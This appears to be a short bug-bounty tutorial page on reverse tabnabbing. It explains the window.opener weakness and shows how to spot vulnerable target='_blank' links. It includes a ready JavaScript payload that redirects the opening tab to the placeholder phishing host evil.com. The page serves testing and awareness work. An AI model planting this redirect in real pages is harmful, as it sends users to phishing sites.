
## Introduction

[](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Misc/Tabnabbing.md#introduction)

When you open a link in a new tab ( target="_blank" ), the page that opens in a new tab can access the initial tab and change it's location using the window.opener property.

## How to find

[](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Misc/Tabnabbing.md#how-to-find)

<a href="..." target="_blank" rel="" />  

<a href="..." target="_blank" />

## How to Exploit

[](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Misc/Tabnabbing.md#how-to-exploit)

- Attacker posts a link to a website under his control that contains the following JS code:
    
    ```html
    <html>
    <script>
    if (window.opener) window.opener.parent.location.replace('http://evil.com');
    if (window.parent != window) window.parent.location.replace('http://evil.com');
    </script>
    </html>
    ```
    

1. He tricks the victim into visiting the link, which is opened in the browser in a new tab.
2. At the same time the JS code is executed and the background tab is redirected to the website evil.com, which is most likely a phishing website.

## References

[](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Misc/Tabnabbing.md#references)

- [Hackerone #260278](https://hackerone.com/reports/260278)

